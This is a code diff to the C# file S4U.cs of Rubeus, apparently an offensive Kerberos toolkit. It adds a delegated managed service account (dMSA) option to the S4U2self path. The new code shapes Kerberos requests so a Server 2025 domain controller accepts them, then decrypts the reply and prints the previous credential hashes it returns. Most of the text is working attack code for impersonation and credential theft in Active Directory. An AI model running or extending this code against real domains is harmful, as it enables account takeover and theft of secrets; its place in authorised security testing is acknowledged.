@@ -1,4 +1,4 @@
-﻿using Asn1;
+using Asn1;
 using Rubeus.lib.Interop;
 using System;
 using System.Net;
@@ -8,10 +8,15 @@ namespace Rubeus
 {
     public class S4U
     {
-        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool show = false)
+        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false, bool bronzebit = false, bool pac = true, string proxyUrl = null, string createnetonly = null, bool dmsa = false, bool show = false)
         {
-            // first retrieve a TGT for the user
-            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac, proxyUrl);
+            // first retrieve a TGT for the user.
+            // For the dMSA S4U2self path, request a TGT whose session key matches the (aes256) long-term key we
+            // hold, instead of Rubeus' default rc4-only non-opsec AS-REQ. A Server 2025 KDC returns an rc4 session
+            // key for an rc4-only AS-REQ, which makes the S4U2self authenticator rc4 and the dMSA request is then
+            // rejected with KDC_ERR_ETYPE_NOTSUPP. impacket's getTGT -aesKey sends an aes256-only AS-REQ for this
+            // reason. suppEtype only takes effect on the non-opsec path (opsec builds its own full etype list).
+            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec, "", false, pac, proxyUrl, suppEtype: dmsa ? etype : Interop.KERB_ETYPE.rc4_hmac);
 
             if (kirbiBytes == null)
             {
@@ -27,9 +32,9 @@ namespace Rubeus
             KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
 
             // execute the s4u process
-            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl, createnetonly, show);
+            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec, bronzebit, keyString, etype, null, null, proxyUrl, createnetonly, dmsa, show);
         }
-        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool show = false)
+        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string requestDomain = "", string impersonateDomain = "", string proxyUrl = null, string createnetonly = null, bool dmsa = false, bool show = false)
         {
             Console.WriteLine("[*] Action: S4U\r\n");
 
@@ -72,7 +77,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType, proxyUrl, createnetonly, show);
+                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec, bronzebit, keyString, encType, proxyUrl, createnetonly, dmsa, show);
                         if (self == null)
                         {
                             Console.WriteLine("[X] S4U2Self failed, unable to perform S4U2Proxy.");
@@ -87,7 +92,7 @@ namespace Rubeus
             }
         }
 
-        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null, string createnetonly = null, bool show = false)
+        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false, string proxyUrl = null, string createnetonly = null, bool dmsa = false, bool show = false)
         {
             Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
             if (!String.IsNullOrEmpty(altService))
@@ -437,7 +442,7 @@ namespace Rubeus
             }
         }
         
-        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null, string createnetonly = null, bool show = false)
+        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false, bool bronzebit = false, string keyString = "", Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial, string proxyUrl = null, string createnetonly = null, bool dmsa = false, bool show = false)
         {
             // extract out the info needed for the TGS-REQ/S4U2Self execution
             string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
@@ -448,7 +453,10 @@ namespace Rubeus
 
             Console.WriteLine("[*] Building S4U2self request for: '{0}@{1}'", userName, domain);
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec);
+            // dMSA S4U2self requests a ticket to krbtgt/REALM (what impacket getST -self -dmsa sends and what
+            // the KDC accepts to return the KERB-DMSA-KEY-PACKAGE); a non-dMSA S4U2self keeps the self sname.
+            // Using targetUser as the sname on the dMSA path yields KDC_ERR_ETYPE_NOTSUPP.
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, dmsa ? ("krbtgt/" + domain) : userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec, false, null, "", false, false, dmsa);
 
             byte[] response = null;
 
@@ -488,6 +496,19 @@ namespace Rubeus
                 byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
+                // extract DMSA key package if present
+                if (dmsa && encRepPart.encryptedPaData?.PA_DMSA_KEY_PACKAGE != null)
+                {
+                    var dmsaKeys = encRepPart.encryptedPaData.PA_DMSA_KEY_PACKAGE;
+                    if (dmsaKeys.previousKeys != null && dmsaKeys.previousKeys.EncryptionKeys != null && dmsaKeys.previousKeys.EncryptionKeys.Count > 0)
+                    {
+                        Console.WriteLine("[*] DMSA Previous Credentials found!");
+                        foreach (var key in dmsaKeys.previousKeys.EncryptionKeys)
+                        {
+                            Console.WriteLine("[*] Previous credential type: {0} hash: {1}", key.keytype, Helpers.ByteArrayToString(key.keyvalue));
+                        }
+                    }
+                }
 
                 // now build the final KRB-CRED structure
                 KRB_CRED cred = new KRB_CRED();
@@ -706,6 +727,19 @@ namespace Rubeus
                 byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                 AsnElt ae = AsnElt.Decode(outBytes, false);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
+                // extract DMSA key package if present
+                if (encRepPart.encryptedPaData != null && encRepPart.encryptedPaData.PA_DMSA_KEY_PACKAGE != null)
+                {
+                    var dmsaKeys = encRepPart.encryptedPaData.PA_DMSA_KEY_PACKAGE;
+                    if (dmsaKeys.previousKeys != null && dmsaKeys.previousKeys.EncryptionKeys != null && dmsaKeys.previousKeys.EncryptionKeys.Count > 0)
+                    {
+                        Console.WriteLine("[*] DMSA Previous Credentials found!");
+                        foreach (var key in dmsaKeys.previousKeys.EncryptionKeys)
+                        {
+                            Console.WriteLine("[*] Previous credential type: {0} hash: {1}", key.keytype, Helpers.ByteArrayToString(key.keyvalue));
+                        }
+                    }
+                }
 
                 // now build the final KRB-CRED structure
                 KRB_CRED cred = new KRB_CRED();
